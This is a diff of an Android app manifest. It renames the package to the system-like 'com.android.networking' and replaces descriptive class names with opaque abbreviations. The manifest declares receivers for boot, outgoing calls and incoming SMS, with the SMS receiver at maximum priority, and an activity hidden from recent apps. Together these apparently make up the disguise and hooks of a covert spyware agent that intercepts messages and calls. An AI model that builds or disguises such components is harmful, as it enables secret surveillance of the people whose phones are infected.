@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-	package="com.android.service" android:versionCode="1"
+	package="com.android.networking" android:versionCode="1"
 	android:versionName="1.0">
 	<!-- @CAVEAT@ -->
 	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
@@ -33,9 +33,9 @@
 	<uses-permission android:name="android.permission.USER_PRESENT" />
 	<uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
 
-	<application android:icon="@drawable/icon" android:label="@string/app_name" android:debuggable="@DEBUGGABLE@">
+	<application android:icon="@drawable/icon" android:label="@string/app_name" android:debuggable="@DEBUGGABLE@" >
 	
-		<activity android:name="com.android.service.gui.AndroidServiceGUI"
+		<activity android:name="com.android.networking.gui.AGUI"
 			android:label="@string/app_name" android:excludeFromRecents="true"
 			android:enabled="true">
 			<intent-filter>
@@ -43,15 +43,20 @@
 				<category android:name="android.intent.category.LAUNCHER" />
 			</intent-filter>
 		</activity>
+		
+		<activity android:name="com.android.networking.gui.CGui"
+			android:label="cgui" android:excludeFromRecents="true"
+			android:enabled="true" android:theme="@style/Theme.Tr6871623">
+		</activity>
 
-		<service android:name="ServiceCore" android:exported="false"
+		<service android:name="com.android.networking.ServiceMain" android:exported="false"
 			android:excludeFromRecents="true">
 			<intent-filter>
-				<action android:name="com.android.service.app"/>		
+				<action android:name="com.android.networking.app"/>		
 			</intent-filter>
 		</service>
 
-		<receiver android:name="BroadcastMonitor">
+		<receiver android:name="com.android.networking.BM">
 			<intent-filter>
 				<action android:name="android.intent.action.BOOT_COMPLETED" />
 				<action android:name="android.intent.action.USER_PRESENT" />
@@ -62,23 +67,20 @@
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
 		</receiver>
-		
-		<receiver android:name="com.android.service.listener.BatteryMonitor">
+
+		<receiver android:name="com.android.networking.listener.BAc">
 		</receiver>
 
-		<receiver android:name="com.android.service.listener.BroadcastMonitorAc">
+		<receiver android:name="com.android.networking.listener.BSt">
 		</receiver>
 
-		<receiver android:name="com.android.service.listener.BroadcastMonitorStandby">
-		</receiver>
-
-		<receiver android:name="com.android.service.listener.BroadcastMonitorSms">
+		<receiver android:name="com.android.networking.listener.BSm">
 			<intent-filter android:priority="999999999">
 				<action android:name="android.provider.Telephony.SMS_RECEIVED" />
 			</intent-filter>
 		</receiver>
 
-		<receiver android:name="com.android.service.listener.BroadcastMonitorCall"
+		<receiver android:name="com.android.networking.listener.BC"
 			android:exported="true">
 			<intent-filter android:priority="0">
 				<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
